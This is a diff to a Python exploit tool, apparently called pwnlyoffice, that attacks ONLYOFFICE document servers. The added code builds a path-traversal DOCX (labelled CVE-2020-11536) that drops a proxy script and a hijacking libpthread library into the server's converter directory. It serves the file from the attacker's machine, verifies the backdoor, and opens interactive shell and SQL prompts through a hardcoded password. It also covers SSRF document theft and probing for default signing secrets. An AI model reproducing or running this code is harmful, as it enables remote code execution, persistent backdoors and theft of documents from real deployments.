@@ -1,9 +1,11 @@
 #!/usr/bin/python3
 # Exploit ONLYOFFICE implementations
 
-import argparse, sys, re, time, signal, requests, uuid, json, tempfile, os, subprocess, websocket, base64, threading, hashlib, datetime, traceback, jwt, shutil
+import argparse, sys, re, time, signal, requests, uuid, json, tempfile, os, subprocess, websocket, base64, threading, hashlib, datetime, traceback, jwt, shutil, multiprocessing
+import http.server
+import socketserver
 from urllib.parse import urlparse, parse_qs
-from zipfile import ZipFile
+from zipfile import ZipFile, ZipInfo
 
 bdpassword = 'BcogExx7Hsmrti'
 
@@ -35,8 +37,8 @@ def process_fileparts( txt, docid=None ):
     outfile = str(docid)+'.docx'
   else:
     outfile = 'document.docx'
-  print('Attempting to convert ',infile,'to',outfile)
-  subprocess.check_output([os.path.dirname(__file__)+'/bin/x2t',infile,outfile])
+  # print('Attempting to convert ',infile,'to',outfile)
+  # subprocess.check_output([os.path.dirname(os.path.realpath('__file__'))+'/bin/x2t',infile,outfile])
   # subprocess.check_output(['open',outfile])
 
 # See if a signed URL is signed by a default secret
@@ -44,8 +46,7 @@ def test_secret_string( signedurl, secret='verysecretstring' ):
   h = get_url_signature( signedurl, secret )
   u = urlparse( signedurl )
   q = parse_qs( u.query )
-  if q['md5'][0] == h:
-    print('Cypto secret is:', secret)
+  return q['md5'][0] == h
 
 def md5( s ):
   m = hashlib.md5()
@@ -66,7 +67,7 @@ def sign_url( url, secret ):
 # Generate a docx dropper for a backdoored docservice bin
 def generate_backdoor( serverroot, password, version, traversedepth ):
   
-  print('Building payload for:')
+  print('Building CVE-2020-11536 payload for:')
   print(' - Server root:', serverroot)
   print(' - Password:', password)
   print(' - Version:', version)
@@ -74,20 +75,7 @@ def generate_backdoor( serverroot, password, version, traversedepth ):
 
   # Create build dir
   scriptdir = os.path.dirname(__file__)
-  builddir = scriptdir + '/build'
-  dsbin = scriptdir + '/bin/docservice'
-  x2tbin = scriptdir + '/bin/x2t'
-  installer = scriptdir + '/src/docservice-installer.sh'
-  if not os.path.isdir( builddir ):
-    os.makedirs( builddir )
 
-  # Clone server repo
-
-  # Switch to correct version tag
-  # Insert backdoor code into JS
-  # npm install all dependencies
-  # pkg to `docservice`
-  
   # Copy blank docx
   docsdir = scriptdir + '/docs'
   docfile = docsdir + '/backdoor.docx'
@@ -97,20 +85,20 @@ def generate_backdoor( serverroot, password, version, traversedepth ):
   zipObj = ZipFile( docfile,'a')
   root = '../' * traversedepth
   if serverroot.startswith('/'): serverroot = serverroot[1:]
-  x2tpath = root + serverroot + '/FileConverter/bin/x2t'
-  dspath  = root + serverroot + '/DocService/docservice'
+    
+  # zipObj.writestr( root + 'tmp/pwnlyoffice', 'Written by pwnlyoffice using CVE-2020-11536' )
   
-  # Write new docservice
-  with open( dsbin, 'rb' ) as f:
-    zipObj.writestr( dspath + '.new', f.read() )
-
-  # Write legit x2t
-  with open( x2tbin, 'rb' ) as f:
-    zipObj.writestr( x2tpath + '.new', f.read() )
-
-  # Overwrite x2t with installer script
-  with open( installer, 'r' ) as f: 
-    zipObj.writestr( x2tpath, f.read() )
+  with open( scriptdir + '/src/proxy.sh', 'r' ) as f:
+    txt = f.read().replace('{PASSWORD}','"'+password+'"')
+    zipObj.writestr( root + serverroot + '/FileConverter/bin/x2t.sh', txt )
+  
+  with open( scriptdir + '/bin/hijack.so', 'rb' ) as f:
+    zipObj.writestr( root + serverroot + '/FileConverter/bin/libpthread.so.0', f.read() )
+  
+  with open( scriptdir + '/bin/x2t', 'rb' ) as f:
+    zipObj.writestr( root + serverroot + '/FileConverter/bin/x2t.old', f.read() )
+  
+  # zipObj.writestr( root + 'tmp/donlyoffice', 'Done' )
   
   zipObj.close()
   print('Done, backdoor dropper written to', docfile)
@@ -121,10 +109,13 @@ class WsClient():
 
   autodownload=False
   testsecret=True
-  output=True
+  output=False
   usejwt = False
+  docurl = None
+  callbacks = []
+  backdoored = None
 
-  def __init__( self, url, docid, platform, username='admin', output=True, disconnect=False, usejwt=False, jwtsecret='secret' ):
+  def __init__( self, url, docid, platform, username='admin', output=False, disconnect=False, usejwt=False, jwtsecret='secret' ):
     self.usejwt = usejwt
     self.jwtsecret = jwtsecret
     self.output = output
@@ -144,7 +135,7 @@ class WsClient():
     if self.platform == 'nextcloud':
       path = '/ds-vpath' + path
     
-    self.url = self.url + path
+    if 'websocket' not in self.url: self.url = self.url + path
 
     if self.output: print( 'Connecting to', self.url )
     self.ws = websocket.create_connection( self.url )
@@ -180,6 +171,7 @@ class WsClient():
   def recv_listen( self ):
     while self.ws.connected:
       msg = self.recv()
+      data = None
       if msg == '': 
         if self.output: print('Exiting listen loop')
         return
@@ -196,17 +188,19 @@ class WsClient():
             self.license = data['license']
 
           elif data['type'] == 'documentOpen':
+            if self.output: print( data )
             if data["data"]["status"] == 'err':
               self.close()
               return
-            print('FOUND:',self.docid)
+            if self.output: print('FOUND:',self.docid)
             if self.testsecret:
               if 'data' in data['data']:
                 for secret in ['secret','SECRET','verysecretstring']:
                   if 'Editor.bin' in data['data']['data']:
-                    test_secret_string( data['data']['data']['Editor.bin'], secret )
+                    s = test_secret_string( data['data']['data']['Editor.bin'], secret )
                   else:
-                    test_secret_string( data['data']['data'], secret )
+                    s = test_secret_string( data['data']['data'], secret )
+                  if self.output and s: print('Crypto secret is:', secret)
             if self.disconnect:
               self.close()
           
@@ -227,7 +221,9 @@ class WsClient():
           else:
             if self.output: print('')
         except Exception as e:
-          if self.output: print("ERR:", e)
+          if self.output: 
+            print("ERR:", e)
+            print(traceback.format_exc())
       elif msg.startswith('c['):
         data = json.loads(msg[1:])
         print(data[1])
@@ -236,10 +232,22 @@ class WsClient():
 
       else:
         if self.output: print("RECV:", msg)
+      if self.autodownload and 'origin.txt' in msg:
+        url = data['data']['data']
+        r = requests.get( url, stream=True )
+        txt = r.content.decode('utf8')
+        data['data']['txt'] = txt
+        print('\n' + r.content.decode('utf8'))
       if self.autodownload and 'Editor.bin' in msg:
         process_fileparts(msg, self.docid)
         if self.disconnect:
           self.close()
+
+      if data: self.exec_callbacks(data)
+
+  def exec_callbacks( self, data ):
+    for cb in self.callbacks:
+      cb(data)
 
   def spawn_listener( self ):
     self.listener = threading.Thread( target=self.recv_listen )
@@ -274,21 +282,143 @@ class WsClient():
       }
     })
 
-  def shell( self, password ):
-    while True:
-      cmd = input()
-      self.shell_exec( cmd, password )
+  # Search for self.uniq in data['txt']
+  def cb_set_backdoored( self, data ):
+    if data['type'] != 'documentOpen': 
+      return
+    if 'txt' in data['data'] and self.uniq in data['data']['txt']:
+      print('Backdoor enabled')
+      self.backdoored = True
+    else:
+      # print('Server not backdoored, or wrong password')
+      self.backdoored = False
+  
+  def test_is_backdoored( self, password ):
+    self.backdoored = None
+    self.uniq = md5(str(time.time()))
+    self.callbacks.append( self.cb_set_backdoored )
+    self.send_backdoor_command( 'SHELL', password,  "echo \"" + base64.b64encode(self.uniq.encode('utf8')).decode('utf8') + "\" | base64 -d" )
+    while self.backdoored is None:
+      time.sleep(0.1)
+    return self.backdoored
 
-  def shell_exec( self, cmd, password ):
-    self.send(
-      {
-        'type':'shell',
-        'data': {
-          'password': password,
-          'command': cmd
-        }
-      }
+  def install_backdoor( self, password ):
+    
+    self.backdoored = None # Set backdoored state to unknown
+
+    # Generate malicious doc
+    print('Generating malicious docx')
+    scriptdir = os.path.dirname(__file__)
+    os.chdir(scriptdir)
+    subprocess.call([os.path.realpath(__file__),'-u',self.url,'backdoor'])
+    time.sleep(1)
+
+    s = 'y' # input('Self-host malicious docx? (Y/n)').strip().lower()
+    if s == 'n':
+      print('Copy bin/backdoor.docx to your web host and enter the URL below')
+    else:
+      os.chdir(scriptdir + '/docs')
+      Handler = http.server.SimpleHTTPRequestHandler
+      PORT = 8000
+      httpd = socketserver.TCPServer(("", PORT), Handler)
+      print("serving at port", PORT)
+      thread = threading.Thread(target=httpd.serve_forever)
+      thread.daemon = True
+      thread.kill = threading.Event()
+      thread.start()
+      defaulturl = 'http://172.17.0.1:8000/backdoor.docx'
+    url = '' # input('URL ['+defaulturl+']: ').strip()
+    if url == '':
+      url = defaulturl
+
+    # Request doc, write the malicious files
+    
+    client = WsClient( 
+      self.url, 
+      md5(str(time.time())), 
+      self.platform, 
+      username=self.username, 
+      usejwt=self.usejwt,
+      jwtsecret=self.jwtsecret
     )
+    client.docurl = url
+    client.auth( )
+    time.sleep(1)
+
+    # Send an additional 2 commands:
+    #  - First one executes libpthread.so if it hasn't already been executed, switching out x2t
+    #  - Second one will run through x2t script, deleting libpthread.so 
+    #  - Third one probably will work
+    thread.kill.set()
+    self.send_backdoor_command( 'SHELL', password, 'id')
+    self.send_backdoor_command( 'SHELL', password, 'id')
+    os.chdir(scriptdir)
+
+  def backdoor( self, cmdtype, password ):
+    self.test_is_backdoored( password )
+    
+    if not self.backdoored:
+      self.install_backdoor( password )
+      if not self.test_is_backdoored( password ):
+        print('Didn\'t appear to work. You could try again, or maybe you broke it entirely')
+        return
+
+    while True:
+      cmd = input(cmdtype + ' $ ')
+      cmd = cmd.strip()
+      if cmd == '': continue
+      self.send_backdoor_command( cmdtype, password, cmd )
+
+  def send_backdoor_command( self, cmdtype, password, cmd ):
+    self.docid = md5(str(time.time()))
+    self.connect()
+    # Request with no URL, no save key, no forgotten, isbuilder True, 
+    self.output = False
+    data = {
+      'type': 'auth',
+      'docid': self.docid,
+      'token': 'a',
+      'user': {
+        'id':'a',
+        'username': self.username,
+        'firstname':'',
+        'lastname':'',
+        'indexUser':-1
+      },
+      'editorType':0,
+      'lastOtherSaveTime':-1,
+      'block':[],
+      'sessionId':None,
+      'sessionTimeConnect':None,
+      'sessionTimeIdle':0,
+      'documentFormatSave':65,
+      'view':False,
+      'isCloseCoAuthoring':False,
+      'openCmd':{ 
+        'c':'open',
+        'id':self.docid,
+        'fileFrom': 'doc.html',
+        'fileTo': 'doc.txt',
+        'userid':self.username,
+        'format':'txt',
+        'url': 'http://localhost',
+        'savekey': None,
+        'forgotten': None,
+        'title': cmdtype + ':' + password + ':' + cmd,
+        'lcid':2057,
+        'isbuilder':True,
+        'nobase64':False,
+        'withAuthorization': True,
+        'externalChangeInfo': None,
+        'wopiParams': None
+      },
+      'lang':None,
+      'mode':None,
+      'permissions':{'edit':True},
+      'IsAnonymousUser':False
+    }
+    self.send( data )
+    # self.receive_task( 'SHELL: ' + cmd )
 
   def create_jwt( self, data ):
     iat = int( time.time() )
@@ -297,8 +427,47 @@ class WsClient():
     jwtstr = jwt.encode( body, self.jwtsecret, algorithm='HS256' ).decode('utf8')
     return jwtstr
 
+  def change_doc_info( self ):
+    data = {
+      'type': 'openDocument',
+      'docid': self.docid,
+      'token': 'a',
+      'user': {
+        'id':'a',
+        'username': self.username,
+        'firstname':'',
+        'lastname':'',
+        'indexUser':-1
+      },
+      'editorType':0,
+      'lastOtherSaveTime':-1,
+      'block':[],
+      'sessionId':None,
+      'sessionTimeConnect':None,
+      'sessionTimeIdle':0,
+      'documentFormatSave':65,
+      'view':False,
+      'isCloseCoAuthoring':False,
+      'openCmd':{
+        'c':'changedocinfo',
+        'id':self.docid,
+        'userid':'a',
+        'format':'txt',
+        'title':'SHELL: id',
+        'lcid':2057,
+        'nobase64':False,
+        'isbuilder': True
+      },
+      'lang':None,
+      'mode':None,
+      'permissions':{'edit':True},
+      'IsAnonymousUser':False
+    }
+    self.send( data )
+
 
   def auth( self, docurl='' ):
+    if docurl: self.docurl = docurl
     data = {
       'type': 'auth',
       'docid': self.docid,
@@ -323,10 +492,11 @@ class WsClient():
         'c':'open',
         'id':self.docid,
         'userid':'a',
-        'format':'docx',
-        'url':docurl,
-        'title':'document.docx',
+        'format':'txt',
+        'url': self.docurl,
+        'title':'new doc',
         'lcid':2057,
+        'isbuilder':True,
         'nobase64':False
       },
       'lang':None,
@@ -408,7 +578,6 @@ def main():
   # Run an SQL command
   shellparse = subparsers.add_parser('sql', help="Execute an SQL command (requires document server to be backdoored)")
   shellparse.add_argument('--password',help='Password to allow backdoored doc server to exec sql commands. Change the default if you ever use this in a real engagement for goodness sake', default=bdpassword)
-  shellparse.add_argument('cmd',help='SQL command to exec')
 
   # Generate DOCX which drops a backdoored version of document server
   bdparse = subparsers.add_parser('backdoor', help='Generate a DOCX which drops a backdoored version of document server')
@@ -463,6 +632,7 @@ def main():
     usejwt=args.usejwt,
     jwtsecret=args.jwtsecret
   )
+  if args.docurl: client.docurl = args.docurl
 
   # Macro injection
   if args.command == 'macro':
@@ -473,11 +643,12 @@ def main():
       client.inject_macro(f.read())
 
   # Poison document cache with external URL
-  # SSRF
+  # SSRF, steal documents
   if args.command == 'dl':
     client.autodownload = True
     client.disconnect = True
-    client.auth( args.docurl )
+    client.output = True
+    client.auth( )
 
   # Chat
   if args.command == 'chat':
@@ -489,17 +660,14 @@ def main():
     client.auth()
     client.rename( args.filename )
 
-  # Run shell command
-  if args.command == 'shell':
-    client.auth()
-    client.shell( args.password )
+  # Provide a shell or SQL prompt 
+  if args.command in ['shell','sql']:
+    client.disconnect = True
+    client.autodownload = True
+    client.auth( args.docurl )
+    client.backdoor( args.command.upper(), args.password )
 
-  # Run sql command
-  if args.command == 'sql':
-    client.auth()
-    client.sql_exec( args.cmd, args.password )
-
-  # Create backdoor file
+  # Create a malicious document
   if args.command == 'backdoor':
     
     # Give license response a chance to come back
